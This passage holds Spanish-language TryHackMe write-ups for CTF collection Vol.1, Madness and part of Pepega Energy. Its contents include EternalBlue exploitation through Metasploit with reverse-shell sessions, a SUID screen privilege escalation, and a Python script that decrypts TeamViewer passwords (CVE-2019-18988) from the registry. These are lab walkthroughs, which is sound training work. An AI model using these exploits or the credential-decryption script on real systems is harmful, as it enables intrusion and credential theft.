encontrarás la solucion para obtener las flags.\n Informacion de la Maquina    Titulo CTF collection Vol.1     Info Sharpening up your CTF skill with the collection. The first volume is designed for beginner.   Puntos 3173   Dificultad Facil   Maker Deskel    What does the base said? Can you decode the following?\nReto:\n1  VEhNe2p1NTdfZDNjMGQzXzdoM19iNDUzfQ==   Reto:\n1  Base64   Meta meta Solucion:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  ➜ ctf_collection_vol1 exiftool Findme.jpg ExifTool Version Number : 10.80 File Name : Findme.jpg Directory : . File Size : 34 kB File Modification Date/Time : 2020:02:12 17:29:21-06:00 File Access Date/Time : 2020:02:12 17:29:54-06:00 File Inode Change Date/Time : 2020:02:12 17:29:49-06:00 File Permissions : rw-rw-r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.01 X Resolution : 96 Y Resolution : 96 Exif Byte Order : Big-endian (Motorola, MM) Resolution Unit : inches Y Cb Cr Positioning : Centered Exif Version : 0231 Components Configuration : Y, Cb, Cr, - Flashpix Version : 0100 Owner Name : THM{... snip ...} Comment : CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 60. Image Width : 800 Image Height : 480 Encoding Process : Progressive DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2) Image Size : 800x480 Megapixels : 0.384 ➜ ctf_collection_vol1   Mon, are we going to be okay?  Something is hiding. That\u0026rsquo;s all you need to know.\nSolucion:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  ➜ ctf_collection_vol1 steghide info Extinction.jpg \u0026#34;Extinction.jpg\u0026#34;: format: jpeg capacity: 1.3 KB Try to get information about embedded data ? (y/n) ➜ ctf_collection_vol1 steghide info Extinction.jpg \u0026#34;Extinction.jpg\u0026#34;: format: jpeg capacity: 1.3 KB Try to get information about embedded data ? (y/n) y Enter passphrase: embedded file \u0026#34;Final_message.txt\u0026#34;: size: 79.0 Byte encrypted: rijndael-128, cbc compressed: yes ➜ ctf_collection_vol1 steghide extract -sf Extinction.jpg Enter passphrase: wrote extracted data to \u0026#34;Final_message.txt\u0026#34;. ➜ ctf_collection_vol1 cat Final_message.txt It going to be over soon. Sleep my child. THM{... snip ...} ➜ ctf_collection_vol1   Erm\u0026hellip;\u0026hellip;Magick Huh, where is the flag?\nSolucion:\nQRrrrr Such technology is quite reliable.\nSolucion:\nReverse it or read it? Solucion:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  ➜ ctf_collection_vol1 r2 hello.hello [0x00001060]\u0026gt; aaa [x] Analyze all flags starting with sym. and entry0 (aa) [x] Analyze len bytes of instructions for references (aar) [x] Analyze function calls (aac) [x] Use -AA or aaaa to perform additional experimental analysis. [x] Constructing a function name for fcn.* and sym.func.* functions (aan) [0x00001060]\u0026gt; afl 0x00001000 3 23 sym._init 0x00001030 1 6 sym.imp.puts 0x00001040 1 6 sym.imp.printf 0x00001050 1 6 sub.__cxa_finalize_248_50 0x00001060 1 43 entry0 0x00001090 3 33 sym.deregister_tm_clones 0x000010c0 3 50 sym.register_tm_clones 0x00001100 4 49 sym.__do_global_dtors_aux 0x00001140 1 5 entry1.init 0x00001145 1 24 sym.skip 0x0000115d 1 23 sym.main 0x00001180 4 93 sym.__libc_csu_init 0x000011e0 1 1 sym.__libc_csu_fini 0x000011e4 1 9 sym._fini [0x00001060]\u0026gt; pdf @sym.skip / (fcn) sym.skip 24 | sym.skip (); | 0x00001145 55 push rbp | 0x00001146 4889e5 mov rbp, rsp | 0x00001149 488d3db80e00. lea rdi, qword str.THM_345y_f1nd_345y_60 ; 0x2008 ; \u0026#34;THM{... snip ...}\u0026#34; | 0x00001150 b800000000 mov eax, 0 | 0x00001155 e8e6feffff call sym.imp.printf ; int printf(const char *format) | 0x0000115a 90 nop | 0x0000115b 5d pop rbp \\  0x0000115c c3 ret [0x00001060]\u0026gt;   Another decoding stuff Can you decode it?\nReto:\n1  3agrSy1CewF9v8ukcSkPSYm3oKUoByUpKG4L   Solucion:\nLeft or right Left, right, left, right\u0026hellip; Rot 13 is too mainstream. Solve this\nReto:\n1  MAF{atbe_max_vtxltk}   Solucion:\nMake a comment No downloadable file, no ciphered or encoded text. Huh \u0026hellip;\u0026hellip;.\nSolucion:\nCan you fix it? I accidentally messed up with this PNG file. Can you help me fix it? Thanks, ^^\nPasamos el archivo a Hexadecimal, editamos el archivo y reemplazamos la cantidad de \u0026ldquo;magic numbers\u0026rdquo; de un archivo PNG, luego de esto podemos obtener nuestra imagen renderizando la con CyberChef.\nReto:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  ➜ ctf_collection_vol1 xxd -p spoil.png \u0026gt; spoil_hex_data ➜ ctf_collection_vol1 head spoil head: cannot open \u0026#39;spoil\u0026#39; for reading: No such file or directory ➜ ctf_collection_vol1 head spoil_hex_data 2333445f0d0a1a0a0000000d4948445200000320000003200806000000db 700668000000017352474200aece1ce9000000097048597300000ec40000 0ec401952b0e1b0000200049444154789cecdd799c9c559deff1cf799e5a bb7a5f927477f640480209201150c420bba288a8805c19067c5d64c079e9 752e03ce38e30e8e2f75e63a23ea8c0ce8308e036470c191cd80880c4b20 0909184c42b64ed2e9f4bed7f23ce7fe51559dea4e27a4bbaaf7effbf5ea 57d2d5554f9daa7abafa7ceb9cf33bc65a6b1111111111111907ce443740 4444444444660e0510111111111119370a202222222222326e1440444444 444464dc28808888888888c8b8510011111111119171a300222222222222 e34601444444444444c68d028888888888888c1b0510111111111119370a ➜ ctf_collection_vol1 vim spoil_hex_data ➜ ctf_collection_vol1 head spoil_hex_data 89504E470D0A1A0A0000000d4948445200000320000003200806000000db 700668000000017352474200aece1ce9000000097048597300000ec40000 0ec401952b0e1b0000200049444154789cecdd799c9c559deff1cf799e5a bb7a5f927477f640480209201150c420bba288a8805c19067c5d64c079e9 752e03ce38e30e8e2f75e63a23ea8c0ce8308e036470c191cd80880c4b20 0909184c42b64ed2e9f4bed7f23ce7fe51559dea4e27a4bbaaf7effbf5ea 57d2d5554f9daa7abafa7ceb9cf33bc65a6b1111111111111907ce443740 4444444444660e0510111111111119370a202222222222326e1440444444 444464dc28808888888888c8b8510011111111119171a300222222222222 e34601444444444444c68d028888888888888c1b0510111111111119370a ➜ ctf_collection_vol1   Solucion:\nRead it Some hidden flag inside Tryhackme social account.\nSolucion:\nSpin my head What is this?\nReto:\n1  ++++++++++[\u0026gt;+\u0026gt;+++\u0026gt;+++++++\u0026gt;++++++++++\u0026lt;\u0026lt;\u0026lt;\u0026lt;-]\u0026gt;\u0026gt;\u0026gt;++++++++++++++.------------.+++++.\u0026gt;+++++++++++++++++++++++.\u0026lt;\u0026lt;++++++++++++++++++.\u0026gt;\u0026gt;-------------------.---------.++++++++++++++.++++++++++++.\u0026lt;++++++++++++++++++.+++++++++.\u0026lt;+++.+.\u0026gt;----.\u0026gt;++++.   Solucion:\nAn exclusive! Exclusive strings for everyone!\nReto:\n1 2  S1: 44585d6b2368737c65252166234f20626d S2: 1010101010101010101010101010101010   Solucion:\n1 2 3 4 5 6  script.py s1 = \u0026#34;44585d6b2368737c65252166234f20626d\u0026#34; s2 = \u0026#34;1010101010101010101010101010101010\u0026#34; a = hex(int(s1, 16) ^ int(s2, 16))[2:] print(bytes.fromhex(a).decode(\u0026#39;utf-8\u0026#39;))   Binary walk Please exfiltrate my file :)\nSolucion:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  ➜ ctf_collection_vol1 binwalk hell.jpg DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.02 30 0x1E TIFF image data, big-endian, offset of first image directory: 8 265845 0x40E75 Zip archive data, at least v2.0 to extract, uncompressed size: 69, name: hello_there.txt 266099 0x40F73 End of Zip archive, footer length: 22 ➜ ctf_collection_vol1 binwalk hell.jpg -e DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 JPEG image data, JFIF standard 1.02 30 0x1E TIFF image data, big-endian, offset of first image directory: 8 265845 0x40E75 Zip archive data, at least v2.0 to extract, uncompressed size: 69, name: hello_there.txt 266099 0x40F73 End of Zip archive, footer length: 22 ➜ ctf_collection_vol1 ls Extinction.jpg Findme.jpg _hell.jpg.extracted help.txt spoil_hex_data ti.py Final_message.txt hell.jpg hello.hello img spoil.webp ➜ ctf_collection_vol1 ls _hell.jpg.extracted 40E75.zip hello_there.txt ➜ ctf_collection_vol1 cat _hell.jpg.extracted/hello_there.txt Thank you for extracting me, you are the best! THM{... snip ...} ➜ ctf_collection_vol1   Darkness There is something lurking in the dark.\nSolucion:\nA sounding QR How good is your listening skill?\nP/S: The flag formatted as THM{Listened Flag}, the flag should be in All CAPS\nSolucion:\nQR:\nDescargamos el archivo de audio y utilizamos Speech to Text.\nDig up the past Sometimes we need a \u0026lsquo;machine\u0026rsquo; to dig the past.\nReto:\n1 2  Targetted website: https://www.embeddedhacker.com/ Targetted time: 2 January 2020   Utilizamos web.archive.org para obtener nuestra flag en la fecha descrita.\nSolucion:\nUncrackable! Can you solve the following? By the way, I lost the key. Sorry \u0026gt;.\u0026lt;\nReto:\n1 2 3  MYKAHODTQ{RVG_YVGGK_FAL_WXF} Flag format: TRYHACKME{FLAG IN ALL CAP}   Utilizamos Vignere Decoder para obtener primero la KEY, utilizamos el formato del flag como KEY (TRYHACKME), luego de eso utilizamos el mismo formato de lo que obtuvimos.\nSolucion:\nSmall bases Decode the following text.\nReto:\n1  581695969015253365094191591547859387620042736036246486373595515576333693   Solucion:\nDecimal \u0026gt; Hex\nHex - Ascii\nRead the packet I just hacked my neighbor\u0026rsquo;s WiFi and try to capture some packet. He must be up to no good. Help me find it.\nSolucion:\nHTTP Wireshark.\n","description":"","id":54,"section":"posts","tags":["challenge"],"title":"TryHackMe - CTF collection Vol.1","uri":"https://sckull.github.io/posts/ctf_collection_vol1/"},{"content":"Madness es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Madness     Info Will you be consumed by Madness?   Puntos 416   Dificultad Facil   Maker Optional    NMAP Escaneo de puertos tcp/udp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  # Nmap 7.80 scan initiated Thu Feb 6 19:01:14 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10.10.53.61 Nmap scan report for 10.10.53.61 Host is up (0.16s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 (RSA) | 256 dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 (ECDSA) |_ 256 e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Feb 6 19:16:00 2020 -- 1 IP address (1 host up) scanned in 886.81 seconds   HTTP Encontramos la pagina principal de Apache en el puerto http (80).\nEn el codigo fuente de la pagina encontramos una image la cual no se muestra en la pagina y al visitarla no se logra visualizar.\nDescargamos la imagen y al ver el tipo de archivo nos muestra lo siguiente:\n1 2 3 4 5 6 7 8 9 10 11 12 13  root@aoiri:~/tryhackme/madness# xxd thm.jpg |head 00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001 .PNG............ 00000010: 0001 0000 ffdb 0043 0003 0202 0302 0203 .......C........ 00000020: 0303 0304 0303 0405 0805 0504 0405 0a07 ................ 00000030: 0706 080c 0a0c 0c0b 0a0b 0b0d 0e12 100d ................ 00000040: 0e11 0e0b 0b10 1610 1113 1415 1515 0c0f ................ 00000050: 1718 1614 1812 1415 14ff db00 4301 0304 ............C... 00000060: 0405 0405 0905 0509 140d 0b0d 1414 1414 ................ 00000070: 1414 1414 1414 1414 1414 1414 1414 1414 ................ 00000080: 1414 1414 1414 1414 1414 1414 1414 1414 ................ 00000090: 1414 1414 1414 1414 1414 1414 1414 ffc0 ................ root@aoiri:~/tryhackme/madness# file thm.jpg thm.jpg: data   Vemos que los magic numbers pertenecen a PNG cuando el archivo esta con extencion JPG, utilizamos xxd para obtener la imagen en hexadecimal, luego de eso con vim editamos el archivo\nFF D8 FF E0 00 10 4A 46 49 46 00 01 1 2  root@aoiri:~/tryhackme/madness# xxd -p thm.jpg \u0026gt; hexthm root@aoiri:~/tryhackme/madness# vim hexthm   Remplazamos exactamente la misma cantidad de valores en hex de JPG.\nAntes:\n89504e470d0a1a0a000000010100000100010000ffdb0043000302020302 Despues:\nFFD8FFE000104A46494600010100000100010000ffdb0043000302020302 Utilizamos CyberChef para renderizar nuestra imagen:\nLa imagen nos muestra una direccion, al visitarla en la pagina encontramos lo siguiente:\nEl codigo fuente nos muestra un comentario:\nUtilizamos GOBUSTER para buscar archivos o directorios en el directorio:\n1 2  root@aoiri:~/tryhackme/madness# gobuster dir -u http://10.10.53.61/th1s_1s_h1dd3n/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -q -t 15 -x php,html,txt /index.php (Status: 200)   A la pagina index le pasamos al parametro secret un numero, al hacer esto se muestra el numero:\nBURPSUITE Utilizamos burpsuite para poder obtener el numero correcto que se encuentra entre 0-99 como lo menciona el comentario que encontramos en la pagina.\nEncontramos con el numero 7+ un mensaje distinto.\nSTEGO Con la imagen que modificamos, utilizamos steghide y con la frase que nos muestra la pagina. Nos muestra el usuario e indica que ya tenemos la contraseña.\n1 2 3 4 5 6 7 8 9 10 11 12  root@aoiri:~/tryhackme/madness# steghide extract -sf imagen.jpg Enter passphrase: wrote extracted data to \u0026#34;hidden.txt\u0026#34;. root@aoiri:~/tryhackme/madness# cat hidden.txt Fine you found the password! Here\u0026#39;s a username wbxre I didn\u0026#39;t say I would make it easy for you! root@aoiri:~/tryhackme/madness#   Intentamos utilizar las credenciales en el servicio SSH pero no funcionó, por lo que utilizamos nuevamente cyberchef para poder \u0026ldquo;decodificar\u0026rdquo; el usuario.\njoker\nUtilizamos steghide para extraer los datos de la imagen de portada de la maquina (no requiere contraseña):\n1 2 3 4 5 6 7 8 9  root@aoiri:~/tryhackme/madness# steghide extract -sf 5iW7kC8.jpg Enter passphrase: wrote extracted data to \u0026#34;password.txt\u0026#34;. root@aoiri:~/tryhackme/madness# password.txt I didn\u0026#39;t think you\u0026#39;d find me! Congratulations! Here take my password *ax[... snip ...]P   SSH - USER Utilizamos las credenciales que encontramos en el servicio SSH, obtenemos nuestra shell y nuestra flat user.txt.\nPRIVILEGE ESCALATION Buscamos por archivos SUID en la maquina, encontramos screen-4.5.0, al realizar la busqueda en exploitdb encontramos un exploit que puede ayudarnos a escalar privilegios.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  joker@ubuntu:~$ find / -perm -g=s -o -perm -u=s -type f 2\u0026gt;/dev/null /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/bin/mlocate /usr/bin/chage /usr/bin/crontab /usr/bin/ssh-agent /usr/bin/wall /usr/bin/vmware-user-suid-wrapper /usr/bin/gpasswd /usr/bin/passwd /usr/bin/newgrp /usr/bin/expiry /usr/bin/chsh /usr/bin/bsd-write /usr/bin/chfn /usr/bin/sudo /usr/local/share/emacs /usr/local/share/emacs/site-lisp /usr/local/share/xml /usr/local/share/xml/schema /usr/local/share/xml/misc /usr/local/share/xml/declaration /usr/local/share/xml/entities /usr/local/share/sgml /usr/local/share/sgml/misc /usr/local/share/sgml/declaration /usr/local/share/sgml/stylesheet /usr/local/share/sgml/entities /usr/local/share/sgml/dtd /usr/local/share/fonts /usr/local/lib/python3.5 /usr/local/lib/python3.5/dist-packages /bin/fusermount /bin/su /bin/ping6 /bin/screen-4.5.0 /bin/screen-4.5.0.old /bin/mount /bin/ping /bin/umount /sbin/unix_chkpwd /sbin/pam_extrausers_chkpwd /var/cache/man /var/mail /var/local /run/log/journal /run/log/journal/2e1e8ccd62e8ef3b80d3aeab5e10fee0 joker@ubuntu:~$   screen-4.5.0\nEjecutamos el exploit en la maquina, obtenemos una shell con usuario root y nuestra flag root.txt.\n","description":"","id":55,"section":"posts","tags":["linux"],"title":"TryHackMe - Madness","uri":"https://sckull.github.io/posts/madness_thm/"},{"content":"Pepega Energy es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Titulo Pepega Energy     Info A new startup has asked for a security audit: turns out there\u0026rsquo;s only one laptop.   Puntos 1642   Dificultad Media   Maker SherlockSec    NMAP Escaneo de puertos tcp/udp, nmap nos muestra varios puertos abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46  # Nmap 7.80 scan initiated Tue Feb 11 18:02:35 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10.10.219.23 Nmap scan report for 10.10.219.23 Host is up (0.15s latency). Not shown: 65522 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 3389/tcp open ssl/ms-wbt-server? |_ssl-date: 2020-02-12T00:24:28+00:00; 0s from scanner time. 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Service Unavailable 5938/tcp open teamviewer? 9001/tcp open tcpwrapped 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49159/tcp open msrpc Microsoft Windows RPC 49160/tcp open msrpc Microsoft Windows RPC Service Info: Host: PEPEGAENERGY-01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_nbstat: NetBIOS name: PEPEGAENERGY-01, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02:a3:b7:7e:bc:1e (unknown) | smb-os-discovery: | OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1) | OS CPE: cpe:/o:microsoft:windows_7::sp1:professional | Computer name: PepegaEnergy-01 | NetBIOS computer name: PEPEGAENERGY-01\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2020-02-12T00:24:21+00:00 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-02-12T00:24:21 |_ start_date: 2020-02-12T00:02:09 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Feb 11 18:25:30 2020 -- 1 IP address (1 host up) scanned in 1375.40 seconds   Utilizamos nuevamente NMAP para escanear el puerto de smb (445) por posibles vulnerabilidades, vemos que es vulnerable a ms17-010.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  # Nmap 7.80 scan initiated Tue Feb 11 18:27:13 2020 as: nmap --script smb-vuln* -p 445 -o nmap_smb_vuln 10.10.219.23 Nmap scan report for 10.10.219.23 Host is up (0.25s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: |_smb-vuln-ms10-054: false |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx | https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ |_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 # Nmap done at Tue Feb 11 18:27:26 2020 -- 1 IP address (1 host up) scanned in 12.34 seconds   METASPLOIT Utilizamos metasploit para poder explotar la vulnerabilidad, primero utilizamos el modulo auxiliar para verificar que la maquina era vulnerable.\n1 2 3 4 5 6 7 8  msf5 auxiliary(scanner/smb/smb_ms17_010) \u0026gt; set rhosts 10.10.219.23 rhosts =\u0026gt; 10.10.219.23 msf5 auxiliary(scanner/smb/smb_ms17_010) \u0026gt; run [+] 10.10.219.23:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.219.23:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf5 auxiliary(scanner/smb/smb_ms17_010) \u0026gt;   Una vez verificado, utilizamos el exploit en contra de la maquina, obteniendo una shell con usuario nt authority\\system.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62  msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; show options Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax \u0026#39;file:\u0026lt;path\u0026gt;\u0026#39; RPORT 445 yes The target port (TCP) SMBDomain . no (Optional) The Windows domain to use for authentication SMBPass no (Optional) The password for the specified username SMBUser no (Optional) The username to authenticate as VERIFY_ARCH true yes Check if remote architecture matches exploit Target. VERIFY_TARGET true yes Check if remote OS matches exploit Target. Exploit target: Id Name -- ---- 0 Windows 7 and Server 2008 R2 (x64) All Service Packs msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; set rhosts 10.10.219.23 rhosts =\u0026gt; 10.10.219.23 msf5 exploit(windows/smb/ms17_010_eternalblue) \u0026gt; run [*] Started reverse TCP handler on 10.8.1.72:4444 [*] 10.10.219.23:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.10.219.23:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.219.23:445 - Scanned 1 of 1 hosts (100% complete) [*] 10.10.219.23:445 - Connecting to target for exploitation. [+] 10.10.219.23:445 - Connection established for exploitation. [+] 10.10.219.23:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.10.219.23:445 - CORE raw buffer dump (42 bytes) [*] 10.10.219.23:445 - 0x00000000 57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73 Windows 7 Profes [*] 10.10.219.23:445 - 0x00000010 73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76 sional 7601 Serv [*] 10.10.219.23:445 - 0x00000020 69 63 65 20 50 61 63 6b 20 31 ice Pack 1 [+] 10.10.219.23:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.10.219.23:445 - Trying exploit with 12 Groom Allocations. [*] 10.10.219.23:445 - Sending all but last fragment of exploit packet [*] 10.10.219.23:445 - Starting non-paged pool grooming [+] 10.10.219.23:445 - Sending SMBv2 buffers [+] 10.10.219.23:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.10.219.23:445 - Sending final SMBv2 buffers. [*] 10.10.219.23:445 - Sending last fragment of exploit packet! [*] 10.10.219.23:445 - Receiving response from exploit packet [+] 10.10.219.23:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.10.219.23:445 - Sending egg to corrupted connection. [*] 10.10.219.23:445 - Triggering free of corrupted buffer. [*] Command shell session 1 opened (10.8.1.72:4444 -\u0026gt; 10.10.219.23:49189) at 2020-02-11 18:35:42 -0600 [+] 10.10.219.23:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.219.23:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.219.23:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami whoami nt authority\\system C:\\Windows\\system32\u0026gt;   Nuestra shell no era meterpreter por lo que utilizamos el modulo de post-explotacion shell_to_meterpreter.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; show options Module options (post/multi/manage/shell_to_meterpreter): Name Current Setting Required Description ---- --------------- -------- ----------- HANDLER true yes Start an exploit/multi/handler to receive the connection LHOST no IP of host that will receive the connection from the payload (Will try to auto detect). LPORT 4433 yes Port for payload to connect to. SESSION yes The session to run this module on. msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; set lhost tun0 lhost =\u0026gt; 10.8.1.72 msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; set session 2 session =\u0026gt; 2 msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; run [*] Upgrading session ID: 2 [*] Starting exploit/multi/handler [*] Started reverse TCP handler on 10.8.1.72:4433 [*] Post module execution completed msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 2 shell x64/windows Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation... 10.8.1.72:4444 -\u0026gt; 10.10.219.23:49193 (10.10.219.23) msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; [*] Sending stage (180291 bytes) to 10.10.219.23 [*] Meterpreter session 3 opened (10.8.1.72:4433 -\u0026gt; 10.10.219.23:49194) at 2020-02-11 18:48:44 -0600 [*] Stopping exploit/multi/handler msf5 post(multi/manage/shell_to_meterpreter) \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 2 shell x64/windows Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation... 10.8.1.72:4444 -\u0026gt; 10.10.219.23:49193 (10.10.219.23) 3 meterpreter x86/windows NT AUTHORITY\\SYSTEM @ PEPEGAENERGY-01 10.8.1.72:4433 -\u0026gt; 10.10.219.23:49194 (10.10.219.23)   TeamViewer - CVE-2019-18988 Dentro de los procesos que se estan ejecutando en la maquina hay un proceso curioso y es TeamViewer. Buscamos vulnerabilidades recientes y vemos el CVE-2019-18988 en el cual indica que pueden ser extraidos datos utilizando querys en claves de registro, en nuestro caso, utilizamos post/windows/gather/credentials/teamviewer_passwords de metasploit y logramos obtener la contraseña.\nTeamViewer - CVE-2019-18988\nPost\nPor alguna razon nuestra contraseña no se muestra completa con el modulo de metasploit, se puede hacer manualmente, haciendo un query al registro:\n1 2 3 4 5 6 7 8  C:\\Users\\Timmy\\Desktop\u0026gt;reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\TeamViewer\\Version7 /v SecurityPasswordAES reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\TeamViewer\\Version7 /v SecurityPasswordAES HKEY_LOCAL_MACHINE\\SOFTWARE\\TeamViewer\\Version7 SecurityPasswordAES REG_BINARY 871C158E545657D6D714B[... snip ...]594917DD1847A810EFF8C13356 C:\\Users\\Timmy\\Desktop\u0026gt;   Luego con un script en python poder desencriptar la conraseña:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  import sys, hexdump, binascii from Crypto.Cipher import AES class AESCipher: def __init__(self, key): self.key = key def decrypt(self, iv, data): self.cipher = AES.new(self.key, AES.MODE_CBC, iv) return self.cipher.decrypt(data) key = binascii.unhexlify(\u0026#34;0602000000a400005253413100040000\u0026#34;) iv = binascii.unhexlify(\u0026#34;0100010067244F436E6762F25EA8D704\u0026#34;) hex_str_cipher = \u0026#34;871C158E545657D6D714B34730465D85E4A[... snip ...]FC41AA4A18ADFE594917DD1847A810EFF8C13356\u0026#34; #Query ciphertext = binascii.unhexlify(hex_str_cipher) raw_un = AESCipher(key).decrypt(iv, ciphertext) print(hexdump.hexdump(raw_un)) password = raw_un.decode(\u0026#39;utf-16\u0026#39;) print(password)   Contraseña:\n1 2 3 4 5 6 7  root@aoiri:~/tryhackme/pepegaenergy# python aes_teamviewer.py 00000000: 52 00 65 00 64 00 42 00 75 00 6C 00 6C 00 45 00 R.e.d.....l.l.E. 00000010: 6E 00 65 00 72 00 67 00 79 00 42 00 61 00 64 00 [... snip ...] 00000020: 58 00 44 00 00 00 00 00 00 00 00 00 00 00 00 00 X............... None Re[... snip ...]D root@aoiri:~/tryhackme/pepegaenergy#   FLAGS En la carpeta de Timmy y 